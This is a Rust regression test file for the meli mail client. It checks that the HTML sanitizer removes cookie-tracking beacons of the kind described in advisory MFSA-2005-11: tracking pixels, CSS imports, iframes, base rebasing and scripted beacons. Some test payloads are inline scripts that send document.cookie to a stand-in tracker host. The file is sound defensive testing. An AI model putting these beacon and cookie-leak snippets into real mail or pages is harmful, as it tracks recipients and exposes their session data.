/*
 * cve - MFSA-2005-11.rs
 *
 * Copyright 2026 Kyle Lee
 *
 * SPDX-License-Identifier: EUPL-1.2 OR GPL-3.0-or-later
 */

//! MFSA-2005-11 (Thunderbird 0.6–0.9, Mozilla Suite 1.7–1.7.3):
//! cookie-tracking beacons in HTML mail (issue #13, table 1 of
//! `SECURITY-CVE-RESEARCH.md` — tracking & privacy).
//!
//! The advisory: mail clients answered cookie-bearing HTTP requests issued
//! by content embedded in HTML mail — `<img>` tracking pixels, stylesheet
//! `<link>`s, CSS `@import`/`url()` — even with the "disable cookies in
//! mail/news" preference set, so a spammer could tag every rendered copy
//! of a message and track its recipients.
//!
//! Attack-surface mapping: meli's mail view renders HTML mail through
//! [`meli::mail::view::html_render`] — [`sanitize`] (ammonia
//! tag/attribute/scheme allowlist) followed by [`render`] (html2text →
//! plain terminal text). The pipeline is pure in-memory text processing:
//! no sockets, no HTTP client, no cookie store, so the
//! mail-content ↔ HTTP-session pathway the advisory describes cannot
//! exist. This regression proves that immunity structurally, not by
//! assertion of absence alone:
//!
//! 1. every MFSA-class auto-loading vector (`<img src>`, stylesheet
//!    `<link>`, `<style>@import`/`url()`, inline `style` URLs, framed and
//!    scripted beacons, `<base>` rebasing, `meta refresh`, form and
//!    image-submit beacons, SVG `<image>`, media `poster`/`src`) loses
//!    its tag *and* its URL in the sanitized output — a whitelist scan of
//!    every tag-shaped construct in the output finds only inert tags;
//! 2. the rendered mail is plain text whose only remote references are
//!    the numbered footnotes of user-facing `<a href>` links — visible
//!    text meli never fetches (following a link is an explicit user
//!    action that hands the URL to an external browser), so viewing a
//!    message cannot issue a cookie-bearing request;
//! 3. sanitization is a fixed point on the corpus — a second parse never
//!    re-derives a live resource reference from inert text.
//!
//! [`sanitize`]: meli::mail::view::html_render::sanitize
//! [`render`]: meli::mail::view::html_render::render

use meli::mail::view::html_render::{render, sanitize};

/// Host of the simulated tracker referenced by every beacon below.
const TRACKER_HOST: &str = "tracker.example";

/// MFSA-2005-11 cookie-beacon carriers: `(name, payload)` pairs, one per
/// auto-loading vector class of the advisory era. Thunderbird's bug was
/// not any single tag — it was that the rendering engine fetched them
/// with cookies attached; meli's equivalent surface is the sanitizer +
/// text pipeline, so each vector is asserted to lose tag and URL
/// together.
const COOKIE_BEACON_VECTORS: &[(&str, &str)] = &[
    // The classic 1×1 tracking pixel of the advisory's spam wave.
    (
        "img_pixel",
        r#"<img src="http://tracker.example/pixel.gif" width="1" height="1" alt=" ">"#,
    ),
    // https beacon tagging the recipient via the query string.
    (
        "img_pixel_recipient_id",
        r#"<img src="https://tracker.example/1x1.png?mid=2005-11&amp;rcpt=victim@example.org">"#,
    ),
    // Tag/attribute case and unquoted-value variants: the HTML tokenizer
    // lowercases names before the allowlist ever sees them.
    (
        "img_uppercase_unquoted",
        r#"<IMG SRC=http://TRACKER.EXAMPLE/caps.gif>"#,
    ),
    // Stylesheet beacon.
    (
        "link_stylesheet",
        r#"<link rel="stylesheet" type="text/css" href="http://tracker.example/style.css">"#,
    ),
    // CSS beacons inside a <style> element: the element dies with its
    // whole content (ammonia `clean_content_tags` default {script,style}).
    (
        "style_import_url",
        r#"<style>@import url("http://tracker.example/beacon.css");</style>"#,
    ),
    (
        "style_css_url",
        r#"<style>body { background-image: url('http://tracker.example/bg.png'); }</style>"#,
    ),
    // Inline `style` attribute carrying a CSS `url()` on a whitelisted
    // carrier: the attribute itself is not whitelisted, so the URL dies
    // with the attribute while the element text survives.
    (
        "inline_style_url",
        r#"<p style="background-image: url(http://tracker.example/inline.png)">text survives</p>"#,
    ),
    // Scripted beacons: external `src` and inline `document.cookie`
    // exfiltration both die with the script element, content included.
    (
        "script_src",
        r#"<script src="http://tracker.example/track.js"></script>"#,
    ),
    (
        "script_inline_cookie_exfil",
        r#"<script>document.cookie="mfsa=read"; new Image().src="http://tracker.example/leak?c="+document.cookie;</script>ok"#,
    ),
    // Framed and embedded beacons.
    (
        "iframe_src",
        r#"<iframe src="http://tracker.example/counts.html" width="0" height="0" style="display:none"></iframe>"#,
    ),
    (
        "object_data",
        r#"<object data="http://tracker.example/object.swf"></object>"#,
    ),
    (
        "embed_src",
        r#"<embed src="http://tracker.example/embed.swf">"#,
    ),
    // `<base>` would silently rebase every relative URL in the mail onto
    // the tracker origin; it must vanish, not merely lose its attribute.
    ("base_href", r#"<base href="http://tracker.example/">"#),
    // `meta refresh` as a delayed redirect beacon.
    (
        "meta_refresh",
        r#"<meta http-equiv="refresh" content="0; url=http://tracker.example/refresh">"#,
    ),
    // Deprecated but historically live: `background` beacons on body,
    // table and td.
    (
        "body_background",
        r#"<body background="http://tracker.example/body-bg.png"><p>x</p></body>"#,
    ),
    (
        "table_background",
        r#"<table background="http://tracker.example/table-bg.png"><tr><td background="http://tracker.example/td-bg.png">c</td></tr></table>"#,
    ),
    // Form-submission beacons: the action URL never becomes reachable
    // markup or visible text.
    (
        "form_action",
        r#"<form action="http://tracker.example/collect" method="post"><input type="text" name="email"></form>"#,
    ),
    (
        "input_image_src",
        r#"<form><input type="image" src="http://tracker.example/button.gif" alt="buy"></form>"#,
    ),
    // Foreign-content beacons: SVG `image`/`xlink:href`, media
    // `poster`/`src`.
    (
        "svg_image_href",
        r#"<svg><image href="http://tracker.example/svg.png" xlink:href="http://tracker.example/xlink.png"/></svg>ok"#,
    ),
    (
        "video_poster_and_src",
        r#"<video poster="http://tracker.example/poster.jpg" src="http://tracker.example/clip.mp4" controls></video>ok"#,
    ),
];

/// The full MFSA-2005-11 spam: one realistic newsletter in which nearly
/// every element doubles as a cookie beacon, plus the legitimate content
/// a rendering pipeline must still deliver. Rendered at any width, every
/// beacon must vanish; only the user-facing `unsubscribe` link may
/// remain, as a numbered footnote.
const MFSA_2005_11_MAIL: &str = r#"<!DOCTYPE html>
<html>
  <head>
    <base href="http://tracker.example/">
    <link rel="stylesheet" href="style.css">
    <style>
      @import url("http://tracker.example/beacon.css");
      body { background: url("http://tracker.example/bg.png"); }
    </style>
    <meta http-equiv="refresh" content="0; url=http://tracker.example/refresh">
    <title>Weekly Deal Newsletter</title>
  </head>
  <body background="http://tracker.example/body-bg.png">
    <img src="http://tracker.example/pixel.gif?mid=2005-11&amp;rcpt=victim@example.org" width="1" height="1" alt=" ">
    <h1>Weekly Deal Newsletter</h1>
    <p>Hello reader, this mail collects <b>great offers</b> for you.</p>
    <table background="http://tracker.example/table-bg.png">
      <tr>
        <td background="http://tracker.example/td-bg.png">50% off everything</td>
      </tr>
    </table>
    <div style="background-image: url('http://tracker.example/div-bg.png')">
      <p>Not interested? Use our
        <a href="http://tracker.example/unsubscribe?u=2005-11&amp;r=victim@example.org">unsubscribe</a>
        page.
      </p>
    </div>
    <iframe src="http://tracker.example/counts.html" width="0" height="0"></iframe>
    <object data="http://tracker.example/object.swf"></object>
    <script src="http://tracker.example/track.js"></script>
    <script>document.cookie = "mfsa2005-11=read";
      fetch("http://tracker.example/leak?c=" + document.cookie);</script>
    <p>Copyright 2005 Tracker Inc.</p>
  </body>
</html>"#;

/// Independent copy of the sanitizer's tag allowlist — the oracle every
/// corpus payload's output is scanned against (mirroring the
/// CVE-2025-66376 corpus in `meli`): widening meli's `sanitize` policy
/// without touching this list fails the corpus tests below.
const INERT_TAG_WHITELIST: &[&str] = &[
    "a",
    "b",
    "blockquote",
    "br",
    "code",
    "em",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "hr",
    "i",
    "li",
    "ol",
    "p",
    "pre",
    "strong",
    "table",
    "td",
    "th",
    "tr",
    "ul",
];

/// Every attribute the sanitizer may keep: `href`/`title` on anchors,
/// generic `lang`/`title`, and ammonia's injected `rel`.
const INERT_ATTR_WHITELIST: &[&str] = &["href", "lang", "rel", "title"];

/// Extract every tag-shaped construct (`<name …>`, `</name>`, `<!…>`,
/// `<?…>`) from serialized HTML, skipping text and character references.
/// Quoted attribute values are skipped so a `<` inside a value cannot be
/// misread as a tag boundary.
fn scan_tags(html: &str) -> Vec<String> {
    let mut tags = Vec::new();
    let mut chars = html.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '<' {
            continue;
        }
        match chars.peek() {
            Some(next) if next.is_ascii_alphabetic() || matches!(*next, '/' | '!' | '?') => {}
            _ => continue,
        }
        let mut tag = String::from("<");
        let mut quote = None;
        for c2 in chars.by_ref() {
            tag.push(c2);
            match quote {
                Some(q) if c2 == q => quote = None,
                Some(_) => {}
                None if c2 == '"' || c2 == '\'' => quote = Some(c2),
                None if c2 == '>' => break,
                None => {}
            }
        }
        tags.push(tag);
    }
    tags
}

/// Assert one serialized tag is inert: a whitelisted (end-)tag name
/// carrying only whitelisted attributes.
fn assert_tag_is_inert(name: &str, tag: &str) {
    let inner = tag
        .strip_prefix('<')
        .and_then(|rest| rest.strip_suffix('>'))
        .unwrap_or_default();
    let body = inner.strip_prefix('/').unwrap_or(inner);
    let tag_name: String = body
        .chars()
        .take_while(|c| !c.is_ascii_whitespace() && *c != '/')
        .collect::<String>()
        .to_ascii_lowercase();
    assert!(
        INERT_TAG_WHITELIST.contains(&tag_name.as_str()),
        "{name}: non-whitelisted tag survived sanitization: {tag:?}"
    );
    // Attribute tokens: whitespace-separated words outside quotes; the
    // first word is the tag name.
    let mut words: Vec<String> = Vec::new();
    let mut word = String::new();
    let mut quote = None;
    for c in body.chars() {
        match quote {
            Some(q) => {
                word.push(c);
                if c == q {
                    quote = None;
                    words.push(std::mem::take(&mut word));
                }
            }
            None if c == '"' || c == '\'' => {
                quote = Some(c);
                word.push(c);
            }
            None if c.is_ascii_whitespace() => {
                if !word.is_empty() {
                    words.push(std::mem::take(&mut word));
                }
            }
            None => word.push(c),
        }
    }
    if !word.is_empty() {
        words.push(word);
    }
    for word in words.iter().skip(1) {
        let attr = word
            .split('=')
            .next()
            .unwrap_or_default()
            .to_ascii_lowercase();
        assert!(
            INERT_ATTR_WHITELIST.contains(&attr.as_str()),
            "{name}: non-whitelisted attribute survived sanitization: {tag:?}"
        );
    }
}

/// Inertness oracle: every tag-shaped construct in the sanitized output
/// passes the whitelist scan, so no element that could auto-load a
/// remote resource (the MFSA beacon classes) exists in the output.
fn assert_sanitized_output_is_inert(name: &str, html: &str) {
    for tag in scan_tags(html) {
        assert_tag_is_inert(name, &tag);
    }
}

/// Every MFSA-2005-11 beacon vector loses its tag *and* its tracker URL
/// in the sanitized output, and sanitization is a fixed point on each —
/// no second parse re-derives a live reference.
#[test]
fn cookie_beacon_vectors_lose_tag_and_url() {
    for (name, vector) in COOKIE_BEACON_VECTORS {
        let out = sanitize(vector);
        assert!(
            !out.to_ascii_lowercase().contains(TRACKER_HOST),
            "{name}: tracker reference survived sanitize: {out:?}"
        );
        assert_sanitized_output_is_inert(name, &out);
        assert_eq!(
            sanitize(&out),
            out,
            "{name}: sanitize output is not a fixed point: {out:?}"
        );
    }
}

/// The same vectors must render to terminal text without failing and
/// without the beacon URL ever reaching visible text.
#[test]
fn cookie_beacon_vectors_render_without_leaking_the_tracker() {
    for (name, vector) in COOKIE_BEACON_VECTORS {
        let text = render(vector.as_bytes(), 80)
            .unwrap_or_else(|err| panic!("{name}: render failed: {err}"));
        assert!(
            !text.to_ascii_lowercase().contains(TRACKER_HOST),
            "{name}: beacon URL reached rendered text: {text:?}"
        );
    }
}

/// The full tracking mail still delivers its legitimate content, keeps
/// exactly one remote reference — the user-facing `unsubscribe` footnote
/// — and no beacon artifact or markup construct survives into the
/// rendered terminal text. meli never fetches a footnote: following the
/// link is an explicit user action on visible text, so no cookie-bearing
/// request can be a side effect of viewing the mail.
#[test]
fn rendered_mail_keeps_only_manual_link_footnotes() {
    let text = render(MFSA_2005_11_MAIL.as_bytes(), 80)
        .expect("rendering the tracking mail must not fail");

    // Legitimate content is still delivered.
    for fragment in [
        "Weekly Deal Newsletter",
        "great offers",
        "50% off everything",
        "unsubscribe",
        "Copyright 2005 Tracker Inc.",
    ] {
        assert!(
            text.contains(fragment),
            "legitimate content lost {fragment:?}: {text:?}"
        );
    }

    // No beacon artifact survives into visible text.
    for artifact in [
        "pixel.gif",
        "track.js",
        "beacon.css",
        "bg.png",
        "table-bg",
        "td-bg",
        "counts.html",
        "object.swf",
        "document.cookie",
        "@import",
        "url(",
        "style.css",
    ] {
        assert!(
            !text.to_ascii_lowercase().contains(artifact),
            "beacon artifact {artifact:?} reached rendered text: {text:?}"
        );
    }

    // The only tracker references left are numbered link footnotes of
    // the manual `unsubscribe` anchor.
    let tracker_lines: Vec<&str> = text
        .lines()
        .filter(|line| line.to_ascii_lowercase().contains(TRACKER_HOST))
        .collect();
    assert!(
        !tracker_lines.is_empty(),
        "manual unsubscribe footnote vanished: {text:?}"
    );
    for line in tracker_lines {
        let trimmed = line.trim();
        assert!(
            trimmed.starts_with('[') && trimmed.contains("]: http"),
            "tracker reference outside a link footnote: {line:?}"
        );
        assert!(
            trimmed.contains("http://tracker.example/unsubscribe"),
            "unexpected tracker footnote: {line:?}"
        );
    }

    // Plain terminal text: no markup construct survives rendering.
    assert!(
        scan_tags(&text).is_empty(),
        "markup leaked into rendered text: {text:?}"
    );
}

/// The sanitize stage alone is a fixed point on the full mail and its
/// output carries only whitelisted inert tags — the structural severing
/// of the content → HTTP-session pathway happens before html2text ever
/// sees the mail.
#[test]
fn sanitize_is_fixed_point_on_the_full_tracking_mail() {
    let out = sanitize(MFSA_2005_11_MAIL);
    assert_sanitized_output_is_inert("full_mail", &out);
    assert_eq!(
        sanitize(&out),
        out,
        "full mail: sanitize output is not a fixed point: {out:?}"
    );
}

/// `<base href>` must vanish entirely: if it survived, every relative
/// URL in the mail would be silently rebased onto the tracker origin —
/// exactly the session-hijacking rebasing MFSA-class trackers rely on.
/// The relative `href` stays literal inert text instead.
#[test]
fn base_href_cannot_rebase_relative_urls() {
    let out = sanitize(
        r#"<base href="http://tracker.example/"><p>See <a href="deal.html">the deal</a>.</p>"#,
    );
    assert!(
        !out.to_ascii_lowercase().contains("<base"),
        "base tag survived sanitize: {out:?}"
    );
    assert!(
        !out.contains(TRACKER_HOST),
        "tracker host leaked via base rebasing: {out:?}"
    );
    assert!(
        out.contains(r#"href="deal.html""#),
        "relative href must stay literal (never rebased): {out:?}"
    );
}

/// A CSS `url()` smuggled into a whitelisted *generic* attribute value
/// (`title`) is dead text: the sanitizer keeps the attribute (nothing
/// interprets CSS in an attribute value), html2text never shows it, and
/// the rendered terminal text carries no trace of the URL. Immunity
/// against MFSA-2005-11 rests on the absence of a fetcher, not on
/// scrubbing inert strings — this locks that boundary explicitly.
#[test]
fn css_url_smuggled_into_generic_attribute_stays_dead_text() {
    let payload = r#"<p title="background:url(http://tracker.example/smuggled.png)">x</p>"#;
    let out = sanitize(payload);
    assert!(
        out.contains(r#"title="background:url(http://tracker.example/smuggled.png)""#),
        "inert whitelisted attribute value must pass through untouched: {out:?}"
    );
    assert_eq!(sanitize(&out), out, "not a fixed point: {out:?}");
    let text = render(payload.as_bytes(), 80).expect("render must not fail");
    assert_eq!(
        text, "x\n",
        "smuggled URL must never reach rendered terminal text: {text:?}"
    );
}
